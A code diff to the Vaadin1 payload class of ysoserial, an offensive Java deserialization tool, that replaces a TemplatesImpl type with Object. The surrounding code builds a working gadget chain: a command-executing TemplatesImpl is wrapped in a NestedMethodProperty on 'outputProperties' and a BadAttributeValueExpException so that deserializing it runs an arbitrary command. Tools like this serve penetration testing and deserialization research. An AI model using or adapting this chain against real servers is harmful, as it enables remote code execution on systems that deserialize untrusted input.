@@ -2,8 +2,6 @@ package ysoserial.payloads;
 
 import javax.management.BadAttributeValueExpException;
 
-import org.apache.xalan.xsltc.trax.TemplatesImpl;
-
 import com.vaadin.data.util.NestedMethodProperty;
 import com.vaadin.data.util.PropertysetItem;
 
@@ -58,10 +56,10 @@ public class Vaadin1 implements ObjectPayload<Object>
     @Override
     public Object getObject (String command) throws Exception
     {
-        TemplatesImpl templ = (TemplatesImpl) Gadgets.createTemplatesImpl (command);
+        Object templ = Gadgets.createTemplatesImpl (command);
         PropertysetItem pItem = new PropertysetItem ();        
         
-        NestedMethodProperty<TemplatesImpl> nmprop = new NestedMethodProperty<TemplatesImpl> (templ, "outputProperties");
+        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
         pItem.addItemProperty ("outputProperties", nmprop);
         
         BadAttributeValueExpException b = new BadAttributeValueExpException ("");
